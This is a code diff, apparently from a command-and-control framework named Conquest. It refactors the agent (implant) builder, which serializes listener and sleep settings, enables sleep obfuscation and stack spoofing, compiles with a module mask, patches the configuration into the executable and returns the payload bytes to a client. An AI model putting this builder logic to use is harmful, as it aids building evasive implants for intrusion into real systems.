@@ -7,7 +7,7 @@ import ../../common/[types, utils, profile, serialize, crypto]
 
 const PLACEHOLDER = "PLACEHOLDER"
 
-proc serializeConfiguration(cq: Conquest, listener: Listener, sleep: int, sleepTechnique: string, spoofStack: bool): seq[byte] = 
+proc serializeConfiguration(cq: Conquest, listener: Listener, sleep: int, sleepTechnique: SleepObfuscationTechnique, spoofStack: bool): seq[byte] = 
     
     var packer = Packer.init()
 
@@ -21,7 +21,7 @@ proc serializeConfiguration(cq: Conquest, listener: Listener, sleep: int, sleepT
 
     # Sleep settings
     packer.add(uint32(sleep))
-    packer.add(uint8(parseEnum[SleepObfuscationTechnique](sleepTechnique.toUpperAscii())))
+    packer.add(uint8(sleepTechnique))
     packer.add(uint8(spoofStack))
 
     # Public key for key exchange
@@ -59,7 +59,7 @@ proc replaceAfterPrefix(content, prefix, value: string): string =
             it
     ).join("\n")
     
-proc compile(cq: Conquest, placeholderLength: int): string = 
+proc compile(cq: Conquest, placeholderLength: int, modules: uint32): string = 
     
     let 
         configFile = fmt"{CONQUEST_ROOT}/src/agent/nim.cfg"  
@@ -75,7 +75,7 @@ proc compile(cq: Conquest, placeholderLength: int): string =
     var config = readFile(configFile)
                     .replaceAfterPrefix("-d:CONFIGURATION=", placeholder)    
                     .replaceAfterPrefix("-o:", exeFile)
-                    # .replaceAfterPrefix("-d:MODULES=", modules)
+                    .replaceAfterPrefix("-d:MODULES=", $modules)
     writeFile(configFile, config)
 
     cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
@@ -106,7 +106,7 @@ proc compile(cq: Conquest, placeholderLength: int): string =
         cq.error("An error occurred: ", err.msg)
         return ""
     
-proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte]): bool = 
+proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte]): seq[byte] = 
     
     cq.info("Patching profile configuration into agent.")
 
@@ -124,44 +124,29 @@ proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte]): bo
         for i, c in Bytes.toString(configuration): 
             exeBytes[placeholderPos + i] = c 
 
-        writeFile(unpatchedExePath, exeBytes)
         cq.success(fmt"Agent payload patched successfully: {unpatchedExePath}.")
-
+        return string.toBytes(exeBytes)
+    
     except CatchableError as err:
         cq.error("An error occurred: ", err.msg) 
-        return false
+        
+    return @[]
 
-    return true 
-    
 # Agent generation 
-proc agentBuild*(cq: Conquest, listener, sleepDelay: string, sleepTechnique: string, spoofStack: bool): bool {.discardable.} =
+proc agentBuild*(cq: Conquest, listenerId: string, sleepDelay: int, sleepTechnique: SleepObfuscationTechnique, spoofStack: bool, modules: uint32): seq[byte] =
 
     # Verify that listener exists
-    if not cq.dbListenerExists(listener.toUpperAscii): 
-        cq.error(fmt"Listener {listener.toUpperAscii} does not exist.")
-        return false
+    if not cq.dbListenerExists(listenerId.toUpperAscii): 
+        cq.error(fmt"Listener {listenerId.toUpperAscii} does not exist.")
+        return
 
-    let listener = cq.listeners[listener.toUpperAscii]
+    let listener = cq.listeners[listenerId.toUpperAscii]
     
-    var config: seq[byte] 
-    if sleepDelay.isEmptyOrWhitespace(): 
-        # If no sleep value has been defined, take the default from the profile 
-        config = cq.serializeConfiguration(listener, cq.profile.getInt("agent.sleep"), sleepTechnique, spoofStack)
-    else: 
-        config = cq.serializeConfiguration(listener, parseInt(sleepDelay), sleepTechnique, spoofStack)
+    var config = cq.serializeConfiguration(listener, sleepDelay, sleepTechnique, spoofStack)
     
-    let unpatchedExePath = cq.compile(config.len)
+    let unpatchedExePath = cq.compile(config.len, modules)
     if unpatchedExePath.isEmptyOrWhitespace():
-        return false
+        return 
 
-    if not cq.patch(unpatchedExePath, config): 
-       return false 
-
-    return true
-
-
-
-    
-    
-
-
+    # Return packet to send to client
+    return cq.patch(unpatchedExePath, config)
